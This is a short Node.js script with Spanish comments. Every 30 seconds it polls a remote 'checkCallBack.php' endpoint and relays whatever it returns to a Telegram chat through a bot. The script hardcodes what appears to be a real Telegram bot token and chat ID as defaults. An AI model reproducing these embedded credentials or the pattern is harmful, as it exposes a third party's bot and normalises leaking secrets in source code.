// index.js
// Script que monitorea la API y envía notificaciones a Telegram

const axios = require('axios');

// ============================================
// CONFIGURACIÓN (desde variables de entorno)
// ============================================
const CONFIG = {
  // API a monitorear
  apiUrl: process.env.API_URL || 'https://cyber-latam2025.com/api/checkCallBack.php',
  
  // Telegram
  telegramToken: process.env.TELEGRAM_TOKEN || '8224721859:AAHfYwnZmN41DtRwfkyLwld_fO3lKcP0s0Y',
  chatId: process.env.CHAT_ID || '-1003277798354',
  
  // Intervalo de chequeo (en milisegundos)
  intervalo: parseInt(process.env.INTERVALO) || 30000, // 30 segundos por defecto
};

const TELEGRAM_API = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;

// ============================================
// FUNCIÓN: Enviar mensaje a Telegram
// ============================================
async function enviarATelegram(datos) {
  try {
    // Convertir datos a texto (JSON formateado)
    const mensaje = typeof datos === 'string' 
      ? datos 
      : JSON.stringify(datos, null, 2);

    await axios.post(TELEGRAM_API, {
      chat_id: CONFIG.chatId,
      text: mensaje
    });

    console.log('✅ Datos enviados a Telegram');
    return true;
  } catch (error) {
    console.error('❌ Error al enviar a Telegram:', error.message);
    return false;
  }
}

// ============================================
// FUNCIÓN: Consultar API y enviar si hay datos nuevos
// ============================================
async function verificarAPI() {
  try {
    console.log(`🔍 Consultando API: ${CONFIG.apiUrl}`);
    
    const response = await axios.get(CONFIG.apiUrl, {
      timeout: 10000 // 10 segundos timeout
    });

    // Si hay datos, enviarlos a Telegram
    if (response.data) {
      console.log('📦 Datos recibidos de la API');
      await enviarATelegram(response.data);
    } else {
      console.log('⚪ Sin datos nuevos');
    }

  } catch (error) {
    console.error('❌ Error al consultar API:', error.message);
  }
}

// ============================================
// FUNCIÓN: Iniciar monitoreo continuo
// ============================================
function iniciarMonitoreo() {
  console.log(`
╔════════════════════════════════════════════╗
║  🚀 SISTEMA DE NOTIFICACIONES INICIADO    ║
╠════════════════════════════════════════════╣
║  📡 API: ${CONFIG.apiUrl.substring(0, 40)}...
║  📱 Telegram Chat ID: ${CONFIG.chatId}
║  ⏱️  Intervalo: ${CONFIG.intervalo / 1000} segundos
╚════════════════════════════════════════════╝
  `);

  // Primera verificación inmediata
  verificarAPI();

  // Verificaciones periódicas
  setInterval(() => {
    verificarAPI();
  }, CONFIG.intervalo);
}

// ============================================
// FUNCIÓN: Enviar mensaje de prueba
// ============================================
async function testTelegram() {
  console.log('🧪 Enviando mensaje de prueba...');
  const mensajePrueba = `
🧪 Test de conexión exitoso
⏰ ${new Date().toLocaleString('es-CO')}
📡 API: ${CONFIG.apiUrl}
  `.trim();
  
  await enviarATelegram(mensajePrueba);
}

// ============================================
// INICIAR SISTEMA
// ============================================

// Si se ejecuta con argumento "test", solo envía mensaje de prueba
if (process.argv[2] === 'test') {
  testTelegram().then(() => {
    console.log('✅ Prueba completada');
    process.exit(0);
  });
} else {
  // Iniciar monitoreo continuo
  iniciarMonitoreo();
}

// Manejo de errores no capturados
process.on('uncaughtException', (error) => {
  console.error('💥 Error crítico:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('💥 Promesa rechazada:', reason);
});